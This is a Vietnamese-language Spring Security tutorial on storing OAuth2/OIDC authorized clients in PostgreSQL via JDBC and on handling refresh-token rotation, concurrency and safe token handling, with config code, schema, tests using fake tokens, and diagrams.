# 34.8. Lưu authorized client bền vững và xử lý refresh token rotation

## 1. Bài thực hành này giải quyết vấn đề gì?

Một ứng dụng **Spring Security OAuth 2.0 OIDC Client** cho phép người dùng đăng nhập vào OpenID Provider (OP), nhận Access Token và có thể nhận Refresh Token để tiếp tục gọi API mà không cần đăng nhập lại sau mỗi lần Access Token hết hạn. Khi phát triển trên máy cá nhân, việc lưu các authorized clients trong bộ nhớ hoặc HTTP session có thể khiến ta tưởng hệ thống đã hoạt động ổn định.

Nhưng trong production, ít nhất bốn tình huống làm lộ ra vấn đề:

1. **Khởi động lại ứng dụng:** Access Token/Refresh Token hoặc kết nối đã được cấp biến mất nếu chỉ lưu trong in-memory store.
2. **Nhiều instances:** Pod A lưu token mới, Pod B vẫn dùng token cũ nếu không có một nguồn dữ liệu chung.
3. **Refresh Token rotation:** Authorization Server phát Refresh Token mới sau mỗi lần refresh, đồng thời có thể vô hiệu Refresh Token cũ. Nếu ghi đè sai hoặc refresh đồng thời, các requests tiếp theo có thể gặp `invalid_grant`.
4. **Failure handler xóa sai record:** Một request dùng bản Refresh Token cũ nhận `invalid_grant` rồi xóa authorized client mới mà request khác vừa lưu.

Trong bài này, bạn sẽ xây dựng một mô hình gồm **persistent authorized-client store**, **OAuth2AuthorizedClientManager**, **fake/test OIDC provider có Refresh Token rotation**, **kiểm thử concurrency** và **hướng nâng cấp lên persistence an toàn trên nhiều nodes**.

### Kết quả mong đợi

Sau bài thực hành, bạn có thể:

- Phân biệt `OAuth2AuthorizedClient`, `OAuth2AuthorizedClientService`, `OAuth2AuthorizedClientRepository` và `OAuth2AuthorizedClientManager`.
- Lưu authorized clients bằng JDBC thay vì chỉ dựa vào bộ nhớ hoặc session.
- Xác nhận authorized client được đọc lại sau khi tạo service instance mới hoặc khởi động lại ứng dụng.
- Kích hoạt refresh khi Access Token sắp hết hạn và lưu Access Token/Refresh Token mới.
- Hiểu hành vi OP khi Refresh Token được **rotate** và khi Refresh Token cũ bị sử dụng lại.
- Ngăn race bằng **single-flight/distributed coordination** kết hợp **versioned compare-and-swap**.
- Phân biệt `invalid_grant` với Token Endpoint timeout/503 và Resource Server 401/403.
- Không ghi token plaintext vào logs, metrics, CI artifacts hoặc test reports.
- Thiết kế test cho các nhánh refresh thành công, rotation race, database failure, account/provider isolation và rollback.

> **Lưu ý phiên bản:** Các ví dụ Java tập trung vào Spring Boot 3.x + Spring Security 6.x, Java 17+, Servlet stack và JDBC. Cách đặt package, bean, schema hoặc API có thể khác ở các nhánh Spring Security mới hơn. Đối chiếu dependency BOM và Javadoc đang sử dụng trước khi copy vào dự án. Ví dụ nâng cao về distributed coordination là bản thiết kế cần tích hợp, không phải một thư viện có thể bật bằng một property.

## 2. Phân biệt những thứ thường bị nhầm

| Thành phần | Vai trò | Có chứa token không? |
| --- | --- | --- |
| `ClientRegistration` | Metadata của OAuth2 client: `registrationId`, `clientId`, grant type, provider endpoints, scopes | Không chứa token user, nhưng có thể chứa client secret |
| `OAuth2AuthorizedClient` | Một kết quả authorization gắn client registration, principal name, Access Token và optional Refresh Token | **Có** |
| `OAuth2AuthorizedClientService` | Lưu/tải/xóa authorized clients theo registration/principal | Store token qua implementation |
| `OAuth2AuthorizedClientRepository` | Lưu/tải/xóa authorized clients theo ngữ cảnh web request/authentication | Có thể dùng session hoặc delegate service |
| `OAuth2AuthorizedClientManager` | Tìm authorized client, ủy quyền mới/refresh khi cần, xử lý success/failure | Đọc và cập nhật token qua repository/service |
| `HttpSession` / `WebSession` | Phiên HTTP của user tại RP | Có thể chứa authentication/state, không đồng nghĩa authorized client |
| `OidcUser` | Principal được xác thực qua OIDC, gồm ID Token và claims | Không phải Refresh Token store |
| Resource Server | API xác minh Access Token/permission | Không quản lý RP HTTP session |

### 2.1. Authorized client được định danh ra sao?

Một implementation mặc định như `OAuth2AuthorizedClientService` thường lưu/tải bằng:

~~~text
(clientRegistrationId, principalName)
    -> OAuth2AuthorizedClient
         registration
         principal
         access token
         optional refresh token
~~~

Ví dụ:

~~~text
(company, alice-sub) -> Access A1 + Refresh R1
(company, bob-sub)   -> Access B1 + Refresh S1
(partner, alice-sub) -> Access P1 + Refresh T1
~~~

**Cảnh báo về định danh:** `sub` chỉ có nghĩa trong phạm vi issuer. Khi hỗ trợ nhiều providers/tenants, identity mapping nội bộ phải dựa trên issuer đã xác minh + subject, không chỉ email hoặc raw `sub`. Việc giữ nguyên `registrationId` nhưng đổi issuer trong cùng một store có thể gây nhầm tokens/identity keys.

### 2.2. Refresh Token không phải ID Token

- **ID Token:** xác thực người dùng tại RP OIDC Login; RP kiểm tra chữ ký, issuer, audience, nonce/thời gian theo flow.
- **Access Token:** được gửi đến Resource Server/UserInfo khi scope/audience phù hợp.
- **Refresh Token:** được gửi tới **Token Endpoint** để xin token mới; không dùng làm Bearer token gọi API.
- **Client Secret/private key:** RP chứng minh danh tính OAuth2 client với Token Endpoint khi client là confidential.

Không ghi bất kỳ giá trị nào trong bốn nhóm này vào log debug hoặc screenshots.

## 3. Kiến trúc phòng lab

~~~mermaid
flowchart LR
    U["Browser / test user"] --> RP["Spring Boot OAuth2/OIDC Client"]
    RP --> F["Spring Security Filter Chain"]
    F --> M["OAuth2AuthorizedClientManager"]
    M --> S["OAuth2AuthorizedClientService"]
    S --> DB[("PostgreSQL token store")]
    M --> OP["Test OpenID Provider / Token Endpoint"]
    RP --> API["Test Resource Server"]
    OP --> RP
    RP --> U
~~~

Trong phần nâng cao:

~~~mermaid
flowchart TB
    A["Pod A"] --> C["Rotation Coordinator"]
    B["Pod B"] --> C
    C --> L["Per-connection distributed lease + fencing"]
    L --> DB[("Versioned encrypted token store")]
    C --> OP["OP Token Endpoint"]
    OP --> C
    C --> CAS["Compare-and-swap save / conditional cleanup"]
    CAS --> DB
~~~

### 3.1. Các thành phần chuẩn bị

| Công cụ | Vai trò |
| --- | --- |
| Java 17+ | Chạy Spring Boot 3.x/Security 6.x |
| Gradle hoặc Maven | Quản lý dependencies |
| Spring Boot Web + OAuth2 Client + Security | OIDC login và authorized-client management |
| Spring JDBC | Persistent `JdbcOAuth2AuthorizedClientService` |
| PostgreSQL | Durable token store dùng chung nhiều instances |
| Test OIDC Provider | Phát authorization code, Access Token, optional Refresh Token |
| Mock HTTP Server/Resource Server | Mô phỏng API 200/401/403 |
| JUnit 5 + Spring Security Test | Unit/integration tests |
| Testcontainers | PostgreSQL thật trong integration tests |

Không dùng actual provider credentials của người dùng production trong phòng lab. Cần test users, test client registration và tokens riêng.

## 4. Đặt tiêu chí chấp nhận trước khi viết code

| ID | Tiêu chí | Bằng chứng |
| --- | --- | --- |
| AC-01 | User đăng nhập, authorized client được lưu | Service/store load được record |
| AC-02 | Tạo instance service mới vẫn đọc được record | Integration test cùng DB |
| AC-03 | Tách pod hoặc restart không mất authorized client | Shared persistence test |
| AC-04 | Access Token chưa hết hạn không refresh vô cớ | Token Endpoint request counter |
| AC-05 | Access Token sắp hết hạn được refresh | Response A2 thay A1 |
| AC-06 | Provider phát Refresh R2 thì store thay R1 bằng R2 | Reload record |
| AC-07 | Provider không phát Refresh Token mới | Giữ Refresh Token cũ khi contract cho phép |
| AC-08 | Hai concurrent requests không gây reuse R1 | Single-flight coordination |
| AC-09 | Stale `invalid_grant` không xóa R2 | Conditional failure cleanup |
| AC-10 | HTTP 503 không xóa grants | Store unchanged, bounded retry |
| AC-11 | Token của Alice không được Bob hoặc registration khác tải | Isolation tests |
| AC-12 | Token không xuất hiện trong logs/metrics/API response | Redaction checks |

Chúng ta sẽ thực hiện **baseline JDBC trước**, sau đó giải thích và kiểm thử nâng cấp cho rotation an toàn. `JdbcOAuth2AuthorizedClientService` là một bước tốt để đạt durability; **một mình nó không bảo đảm single-flight refresh hay encryption ở tầng ứng dụng**.

## 5. Cấu hình test OpenID Provider

Tạo một confidential OIDC client ở **test provider**, ví dụ:

~~~text
Provider issuer:
  https://id.example.test/realms/lab

Registration ID:
  company

Client ID:
  portal-lab

Grant types:
  authorization_code
  refresh_token (khi provider hỗ trợ)

Redirect URI:
  http://localhost:8080/login/oauth2/code/company

Scopes:
  openid profile email
  optional offline_access (nếu OP yêu cầu)
~~~

Yêu cầu provider phát Refresh Token và có khả năng cấu hình **Refresh Token rotation/reuse detection** để mô phỏng lỗi. Các cài đặt như “rotate refresh token”, “refresh token max reuse”, “consent” hoặc “offline access” **phụ thuộc từng OP**; không có một property Spring Boot chung bật rotation ở phía Authorization Server.

### 5.1. Cho Access Token có thời gian sống ngắn

Trong **test environment**, cấu hình Access Token TTL khoảng vài chục giây để quan sát refresh nhanh. Không tự sửa trường `exp` của JWT bằng tay; RP và OP phải thống nhất token mà OP thực sự phát.

### 5.2. Hai chế độ provider cần kiểm thử

**Chế độ 1 — Không rotate:**

~~~text
Request:
  grant_type=refresh_token
  refresh_token=R1

Response:
  access_token=A2
  refresh_token omitted OR refresh_token=R1 (theo contract)
~~~

**Chế độ 2 — Rotate:**

~~~text
Request:
  grant_type=refresh_token
  refresh_token=R1

Response:
  access_token=A2
  refresh_token=R2

Subsequent R1 reuse:
  invalid_grant
  possibly refresh-token family revocation by OP policy
~~~

Hai chế độ có ý nghĩa khác nhau. Không giả định provider luôn rotate, và cũng không giả định mọi `invalid_grant` đồng nghĩa token bị đánh cắp.

## 6. Dependencies cho phần JDBC baseline

Ví dụ Gradle cho Spring Boot 3.x:

~~~groovy
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-web'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-oauth2-client'
    implementation 'org.springframework.boot:spring-boot-starter-jdbc'
    implementation 'org.springframework.boot:spring-boot-starter-actuator'

    runtimeOnly 'org.postgresql:postgresql'

    testImplementation 'org.springframework.boot:spring-boot-starter-test'
    testImplementation 'org.springframework.security:spring-security-test'
    testImplementation 'org.testcontainers:junit-jupiter'
    testImplementation 'org.testcontainers:postgresql'
}
~~~

Dependencies này là một **mẫu**; cần dùng version BOM tương thích với Java/Spring Boot của dự án. Nếu sử dụng WebFlux thay Servlet, dependencies và security DSL khác; phần Reactive sẽ được giải thích ở cuối bài.

### 6.1. Cấu hình môi trường

~~~yaml
spring:
  datasource:
    url: ${DB_JDBC_URL}
    username: ${DB_USERNAME}
    password: ${DB_PASSWORD}

  security:
    oauth2:
      client:
        registration:
          company:
            provider: company-oidc
            client-id: ${OIDC_CLIENT_ID}
            client-secret: ${OIDC_CLIENT_SECRET}
            client-authentication-method: client_secret_basic
            authorization-grant-type: authorization_code
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
            scope: [openid, profile, email, offline_access]
        provider:
          company-oidc:
            issuer-uri: https://id.example.test/realms/lab

logging:
  level:
    org.springframework.security: INFO
~~~

`offline_access` ở đây chỉ là **yêu cầu scope**; việc OP có cấp Refresh Token hay không phụ thuộc đăng ký client, consent, policies và provider contract. Không commit giá trị thật của database password/client secret vào Git.

### 6.2. Điều kiện để có Refresh Token

Spring Security Client **không thể tự tạo** Refresh Token nếu OP không cấp. Nếu authorized client không có Refresh Token:

- Với Authorization Code/OIDC Login, user có thể cần authorization request/consent mới theo OP policy.
- Với Client Credentials, thông thường không có user Refresh Token; khi Access Token hết hạn, manager xin Access Token mới bằng `client_credentials`.
- Không tạo Refresh Token giả hoặc lưu client secret trong trường Refresh Token.

## 7. Chuẩn bị schema JDBC persistent store

Spring Security cung cấp SQL schema tham khảo cho `JdbcOAuth2AuthorizedClientService`, thường nằm trong resource:

~~~text
org/springframework/security/oauth2/client/oauth2-client-schema.sql
~~~

Khi dùng PostgreSQL, hãy chuyển schema tham khảo **đúng phiên bản framework** thành migration được quản lý bởi Flyway/Liquibase hoặc công cụ migration tương đương; kiểm tra types, column names và JDBC driver behavior.

Ví dụ **PostgreSQL-oriented** (cần đối chiếu với schema của Spring Security version đang sử dụng):

~~~sql
CREATE TABLE oauth2_authorized_client (
    client_registration_id VARCHAR(100) NOT NULL,
    principal_name VARCHAR(200) NOT NULL,
    access_token_type VARCHAR(100) NOT NULL,
    access_token_value BYTEA NOT NULL,
    access_token_issued_at TIMESTAMP NOT NULL,
    access_token_expires_at TIMESTAMP NOT NULL,
    access_token_scopes VARCHAR(1000),
    refresh_token_value BYTEA,
    refresh_token_issued_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
    PRIMARY KEY (client_registration_id, principal_name)
);
~~~

**Không tùy tiện thay tên/bỏ cột của schema khi còn dùng implementation JDBC mặc định**: SQL readers/writers của Spring Security mong đợi schema cụ thể. Với PostgreSQL, cần xác minh `BYTEA` và kiểu timestamp phù hợp mapper của driver/framework version. Không sao chép schema MySQL/H2 một cách mù quáng.

### 7.1. Vì sao primary key quan trọng?

~~~text
PRIMARY KEY (client_registration_id, principal_name)
~~~

Nó tránh hai records cùng khóa ở lớp JDBC service mặc định. Tuy nhiên **primary key không ngăn hai requests cùng đọc Refresh Token cũ rồi gọi Token Endpoint đồng thời**.

### 7.2. Không dùng `ddl-auto=create-drop` cho token store

Một bảng chứa OAuth2 credentials phải sống qua deployment. Không cấu hình hệ thống để drop/recreate bảng sau mỗi restart. Sử dụng migration versioning, backup và retention policy rõ ràng.

### 7.3. Bảo vệ database

Database này lưu token **nhạy cảm cao**. Ít nhất cần:

- Quyền SQL tối thiểu cho workload; hạn chế direct database access.
- Encryption at rest và backups được mã hóa.
- TLS tới database, credential rotation và secret manager.
- Không dùng database superuser cho application.
- Không chạy query dump `access_token_value`/`refresh_token_value` vào tickets.
- Với yêu cầu bảo mật cao, **application-level envelope encryption** hoặc tương đương; implementation JDBC mặc định không tự bảo đảm encryption at application layer.

## 8. Bean `JdbcOAuth2AuthorizedClientService`

Một cấu hình Spring Security Servlet:

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.jdbc.core.JdbcOperations;
import org.springframework.security.oauth2.client.JdbcOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.AuthenticatedPrincipalOAuth2AuthorizedClientRepository;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;

@Configuration
public class AuthorizedClientPersistenceConfig {

    @Bean
    OAuth2AuthorizedClientService authorizedClientService(
            JdbcOperations jdbc,
            ClientRegistrationRepository clientRegistrations) {

        return new JdbcOAuth2AuthorizedClientService(
            jdbc, clientRegistrations);
    }

    @Bean
    OAuth2AuthorizedClientRepository authorizedClientRepository(
            OAuth2AuthorizedClientService service) {

        return new AuthenticatedPrincipalOAuth2AuthorizedClientRepository(
            service);
    }
}
~~~

**Ý nghĩa:**

1. `JdbcOAuth2AuthorizedClientService` lưu tokens trong database.
2. `AuthenticatedPrincipalOAuth2AuthorizedClientRepository` đưa authorized client của authenticated principal vào service bền vững; anonymous web context có behavior riêng.
3. `oauth2Login()` và managers sử dụng repository/service được inject theo Spring context, thay vì tự tạo một `InMemoryOAuth2AuthorizedClientService`.

### 8.1. Đừng đăng ký hai beans cạnh tranh không chủ ý

Nếu đã có custom repository/service ở application, việc thêm bean mới nhưng không dùng nó trong SecurityFilterChain/WebClient/manager sẽ khiến token vẫn lưu ở store cũ. Kiểm tra dependency injection, bean qualifiers và đường đi request thực tế.

### 8.2. JDBC mặc định không tự mã hóa token ở tầng ứng dụng

Các token values được lưu dưới dạng bytes theo mapper của service. Database encryption at rest và TLS là cần thiết, nhưng nếu threat model yêu cầu chống truy cập token bởi database operators/backups, cần **custom encrypted implementation**. Không tuyên bố `JdbcOAuth2AuthorizedClientService` đã đáp ứng toàn bộ bảo vệ token chỉ vì cột là `BYTEA`.

## 9. Cấu hình `OAuth2AuthorizedClientManager` cho Servlet requests

Manager lấy authorized client hiện có, quyết định có cần refresh và lưu kết quả qua repository:

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProvider;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.DefaultOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;

@Configuration
public class AuthorizedClientManagerConfig {

    @Bean
    OAuth2AuthorizedClientManager authorizedClientManager(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientRepository repository) {

        OAuth2AuthorizedClientProvider provider =
            OAuth2AuthorizedClientProviderBuilder.builder()
                .authorizationCode()
                .refreshToken()
                .clientCredentials()
                .build();

        DefaultOAuth2AuthorizedClientManager manager =
            new DefaultOAuth2AuthorizedClientManager(
                registrations, repository);
        manager.setAuthorizedClientProvider(provider);

        return manager;
    }
}
~~~

Đây là **Servlet request-oriented manager**. `authorizationCode()` không có nghĩa manager có thể tự mở một browser khi đang chạy background job. OIDC Login browser flow phải được cấu hình và xử lý qua Spring Security filters.

### 9.1. Có cần custom success/failure handlers ngay không?

Đối với baseline, giữ default success/failure behavior khi đã hiểu phiên bản. Spring Security managers có thể lưu authorized client sau authorization thành công và xóa authorized client khi refresh thất bại với lỗi phù hợp như `invalid_grant`.

**Cảnh báo production:** với nhiều nodes và Refresh Token rotation, việc **xóa không có điều kiện** ở failure handler có thể đụng race. Phần nâng cao sẽ thay cách update/remove bằng versioned logic và điều phối refresh. Không chỉ bọc service JDBC bằng một `synchronized` local rồi coi đã an toàn trên cluster.

### 9.2. Không dùng default authorized client cho mọi URL

Một `RestClient`/`WebClient` có thể gửi Access Token đến outgoing URL. Chỉ gắn token vào **trusted Resource Server** với đúng audience/scopes; không để user nhập arbitrary URL rồi tự gắn OAuth2 token, tránh SSRF và token exfiltration.

## 10. SecurityFilterChain cho OIDC Login

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
public class LoginSecurityConfig {

    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http)
            throws Exception {

        return http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login", "/error").permitAll()
                .anyRequest().authenticated())
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login"))
            .build();
    }
}
~~~

Đây là skeleton độc lập với custom login page `/login` cần ứng dụng triển khai. URL khởi tạo login mặc định:

~~~text
GET /oauth2/authorization/company
~~~

Callback thường là:

~~~text
GET /login/oauth2/code/company?code=...&state=...
~~~

Không log raw `code` hoặc `state`. Spring Security sử dụng authorization request/session correlation, PKCE và OIDC ID Token validation; không thay các bước đó bằng custom code chỉ để dễ debug.

### 10.1. Trường hợp ứng dụng có nhiều security chains

Khi có API chain, web/login chain và actuator chain, phải cấu hình matchers/order rõ ràng. Nếu một chain match `/login/oauth2/code/*` sai, callback có thể không hoàn tất và authorized client không bao giờ được lưu.

## 11. Hành trình lưu authorized client sau login

~~~mermaid
sequenceDiagram
    autonumber
    actor Browser
    participant RP as Spring Security OAuth2 Login
    participant OP as OpenID Provider
    participant Repo as AuthorizedClientRepository
    participant JDBC as JDBC AuthorizedClientService
    participant DB as PostgreSQL
    Browser->>RP: Start /oauth2/authorization/company
    RP-->>Browser: Redirect to OP with state/PKCE
    Browser->>OP: Authenticate, grant consent
    OP-->>Browser: code + state callback
    Browser->>RP: Callback
    RP->>OP: Exchange code for tokens
    OP-->>RP: ID Token, A1, optional R1
    RP->>RP: Validate ID Token and create Authentication
    RP->>Repo: saveAuthorizedClient(...)
    Repo->>JDBC: saveAuthorizedClient(...)
    JDBC->>DB: INSERT/UPDATE authorized client
    RP-->>Browser: Session cookie + success redirect
~~~

### 11.1. Hai phép lưu độc lập

- **HTTP session/SecurityContext:** duy trì trạng thái user authenticated tại RP.
- **Authorized client store:** lưu Access/Refresh Tokens gắn registration/principal.

Một cái có thể còn trong khi cái kia mất. Ví dụ browser session hết hạn nhưng service vẫn giữ authorized client record để một background workflow được phép dùng — điều này cần policy về user consent/revocation, không tự coi token còn trong DB nghĩa là mọi job được phép chạy.

### 11.2. Quan sát kết quả an toàn

Không chạy `SELECT *` trong ticket hay in token bytes. Ví dụ query metadata:

~~~sql
SELECT
    client_registration_id,
    access_token_expires_at,
    (refresh_token_value IS NOT NULL) AS refresh_token_present,
    created_at
FROM oauth2_authorized_client
WHERE client_registration_id = 'company';
~~~

Ngay cả `principal_name` có thể là PII/subject; chỉ truy xuất khi có quyền và nhu cầu điều tra chính đáng, hoặc chuyển sang alias không nhạy cảm trong logging/reporting.

## 12. Thực hành A — Xác minh dữ liệu sống qua restart

**Bước 1:** chạy PostgreSQL test và migration cho bảng `oauth2_authorized_client`.

**Bước 2:** chạy Spring Boot app với cấu hình `company` và kết nối database thật.

**Bước 3:** đăng nhập bằng **test user** qua OP. Xác nhận API/callback thành công.

**Bước 4:** kiểm tra metadata từ database (`refresh_token_present`, `access_token_expires_at`) hoặc API diagnostics đã giới hạn quyền; **không in giá trị token**.

**Bước 5:** restart ứng dụng nhưng **không xóa database**.

**Bước 6:** tạo service mới hoặc gọi `loadAuthorizedClient("company", principalName)` theo đúng identity key và kiểm tra record vẫn tồn tại.

**Bước 7:** phân biệt kết quả:

~~~text
Authorized client persisted = true
Browser HTTP session persisted = depends on session store
User may need login again = possible even when token record remains
~~~

Với local in-memory HTTP session, restart vẫn có thể làm mất browser login; điều này **không chứng minh JDBC authorized-client persistence thất bại**.

### 12.1. Expected result

~~~text
Before restart:
  (company, test-user) -> authorized client exists

After restart:
  JDBC service reload -> authorized client exists
  access token expiry metadata unchanged
  refresh token presence unchanged
~~~

### 12.2. Nếu record không xuất hiện

Kiểm tra:

- Application có thực sự dùng `JdbcOAuth2AuthorizedClientService` bean không?
- `AuthenticatedPrincipalOAuth2AuthorizedClientRepository` đã được wired?
- Login dùng đúng `registrationId`?
- Database/schema có lỗi quyền/connection/transaction rollback?
- OP có thực sự cấp token thành công?
- Principal khi `save` có trùng principal khi `load` không?
- App có custom repository/handler ghi vào session hoặc in-memory store khác?

## 13. Unit/integration test cho JDBC service

Trong test, tạo một `ClientRegistration` dùng giá trị giả; không cần lấy token thật:

~~~java
import java.time.Instant;
import java.util.Set;

import org.springframework.security.oauth2.client.registration.ClientRegistration;
import org.springframework.security.oauth2.client.registration.InMemoryClientRegistrationRepository;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.JdbcOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.core.AuthorizationGrantType;
import org.springframework.security.oauth2.core.ClientAuthenticationMethod;
import org.springframework.security.oauth2.core.OAuth2AccessToken;
import org.springframework.security.oauth2.core.OAuth2RefreshToken;

ClientRegistration registration = ClientRegistration
    .withRegistrationId("company")
    .clientId("portal-lab")
    .clientSecret("test-only-secret")
    .clientAuthenticationMethod(
        ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
    .authorizationGrantType(
        AuthorizationGrantType.AUTHORIZATION_CODE)
    .redirectUri("{baseUrl}/login/oauth2/code/{registrationId}")
    .authorizationUri("https://id.example.test/authorize")
    .tokenUri("https://id.example.test/token")
    .jwkSetUri("https://id.example.test/jwks")
    .userInfoUri("https://id.example.test/userinfo")
    .userNameAttributeName("sub")
    .scope("openid", "profile", "offline_access")
    .build();

Instant now = Instant.now();

OAuth2AccessToken access = new OAuth2AccessToken(
    OAuth2AccessToken.TokenType.BEARER,
    "access-test-A1",
    now.minusSeconds(5),
    now.plusSeconds(90),
    Set.of("openid", "profile"));

OAuth2RefreshToken refresh =
    new OAuth2RefreshToken("refresh-test-R1", now);

OAuth2AuthorizedClient authorized =
    new OAuth2AuthorizedClient(
        registration, "alice-test-sub", access, refresh);
~~~

Đây là **fixture fragment**, không phải code production. Nếu `ClientRegistration.Builder` ở framework version yêu cầu thêm trường, bổ sung đúng contract.

### 13.1. Test save → load bằng service instance khác

~~~java
// Giả định JdbcOperations jdbc cùng trỏ tới một DB test
// và bảng oauth2_authorized_client đã được migrate.
var registrations =
    new InMemoryClientRegistrationRepository(registration);

var writer = new JdbcOAuth2AuthorizedClientService(
    jdbc, registrations);
writer.saveAuthorizedClient(authorized);

// Instance mới -> không dùng lại object writer.
var reader = new JdbcOAuth2AuthorizedClientService(
    jdbc, registrations);
OAuth2AuthorizedClient loaded =
    reader.loadAuthorizedClient("company", "alice-test-sub");

assertNotNull(loaded);
assertEquals("access-test-A1",
    loaded.getAccessToken().getTokenValue());
assertEquals("refresh-test-R1",
    loaded.getRefreshToken().getTokenValue());
~~~

`saveAuthorizedClient` của `OAuth2AuthorizedClientService` nhận **một** `OAuth2AuthorizedClient`; principal name đã nằm bên trong object. Không nhầm với `OAuth2AuthorizedClientRepository.saveAuthorizedClient(...)`, vốn có thêm `Authentication` và request/response.

### 13.2. Test update token sau refresh

~~~java
OAuth2AccessToken access2 = new OAuth2AccessToken(
    OAuth2AccessToken.TokenType.BEARER,
    "access-test-A2",
    now.plusSeconds(10),
    now.plusSeconds(310),
    Set.of("openid", "profile"));

OAuth2RefreshToken refresh2 =
    new OAuth2RefreshToken("refresh-test-R2", now.plusSeconds(10));

OAuth2AuthorizedClient rotated =
    new OAuth2AuthorizedClient(
        registration, "alice-test-sub", access2, refresh2);

writer.saveAuthorizedClient(rotated);

OAuth2AuthorizedClient reloaded =
    reader.loadAuthorizedClient("company", "alice-test-sub");

assertEquals("access-test-A2",
    reloaded.getAccessToken().getTokenValue());
assertEquals("refresh-test-R2",
    reloaded.getRefreshToken().getTokenValue());
~~~

Các tokens này chỉ là **fake test values**, không phải credentials thật. Một test hoàn chỉnh cần khởi tạo DB/schema, thực hiện setup/cleanup, kiểm tra khác principal/registration và không ghi token vào logs.

### 13.3. Test remove

~~~java
writer.removeAuthorizedClient("company", "alice-test-sub");

assertNull(reader.loadAuthorizedClient(
    "company", "alice-test-sub"));
~~~

Lệnh remove xóa record local, **không** gọi revocation endpoint của OP. Kiểm thử revoke remote là trường hợp khác.

## 14. OIDC login và background jobs có manager khác nhau

Trong Servlet request, `DefaultOAuth2AuthorizedClientManager` sử dụng `OAuth2AuthorizedClientRepository`. Nhưng scheduled jobs không có `HttpServletRequest`/`HttpServletResponse` thông thường, nên cần manager phù hợp với `OAuth2AuthorizedClientService`.

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.AuthorizedClientServiceOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;

@Configuration
public class BackgroundOAuthClientConfig {

    @Bean("backgroundAuthorizedClientManager")
    OAuth2AuthorizedClientManager backgroundAuthorizedClientManager(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientService service) {

        AuthorizedClientServiceOAuth2AuthorizedClientManager manager =
            new AuthorizedClientServiceOAuth2AuthorizedClientManager(
                registrations, service);

        manager.setAuthorizedClientProvider(
            OAuth2AuthorizedClientProviderBuilder.builder()
                .refreshToken()
                .clientCredentials()
                .build());

        return manager;
    }
}
~~~

### 14.1. Client Credentials khác delegated user token

Với Client Credentials registration:

~~~java
OAuth2AuthorizeRequest request =
    OAuth2AuthorizeRequest.withClientRegistrationId("reports-machine")
        .principal("reports-scheduler")
        .build();

OAuth2AuthorizedClient client =
    backgroundAuthorizedClientManager.authorize(request);
~~~

**Đây là fragment minh họa**: cần định nghĩa manager, import các class và registration `reports-machine` grant type `client_credentials`. Client Credentials thường **không cấp Refresh Token**; khi Access Token hết hạn, manager xin token mới bằng client credentials. Không giả vờ machine token là delegated user token.

### 14.2. Delegated user connection trong background

Một job dùng Refresh Token đã được user cấp cần:

- Connection thuộc đúng authenticated user/internal account.
- Consent/policy cho phép background access.
- Principal name tương ứng key đã dùng khi login/save.
- Token storage, rotation và revocation được kiểm soát.
- Không lấy một browser user Access Token rồi tái sử dụng cho job của tenant khác.

Nếu principal key bị đổi từ `sub` sang email hoặc account ID mà không migrate store, manager có thể không tìm thấy authorized client cũ.

## 15. Thực hành B — Quan sát Access Token tự refresh

### 15.1. Preconditions

- OP test đã cấp Access Token A1 và Refresh Token R1.
- Authorized client `(company, alice-test-sub)` đã lưu trong JDBC.
- Access Token A1 gần hoặc đã hết hạn theo manager/provider clock skew.
- Manager có `refreshToken()` provider được cấu hình.

### 15.2. Trình tự logic

~~~mermaid
sequenceDiagram
    autonumber
    participant App as OAuth2AuthorizedClientManager
    participant DB as Persistent Store
    participant OP as Token Endpoint
    App->>DB: load(company, alice)
    DB-->>App: A1 expires soon, R1
    App->>OP: POST grant_type=refresh_token + R1
    OP-->>App: Access A2 + Refresh R2
    App->>DB: save(company, alice, A2, R2)
    DB-->>App: Committed
    App-->>App: Use Access A2 for intended API
~~~

### 15.3. HTTP request minh họa (đã redacted)

~~~http
POST /realms/lab/protocol/openid-connect/token HTTP/1.1
Host: id.example.test
Content-Type: application/x-www-form-urlencoded
Authorization: Basic REDACTED_CLIENT_AUTH

grant_type=refresh_token&
refresh_token=REDACTED_R1
~~~

Response:

~~~json
{
  "access_token": "REDACTED_A2",
  "token_type": "Bearer",
  "expires_in": 300,
  "refresh_token": "REDACTED_R2",
  "scope": "openid profile"
}
~~~

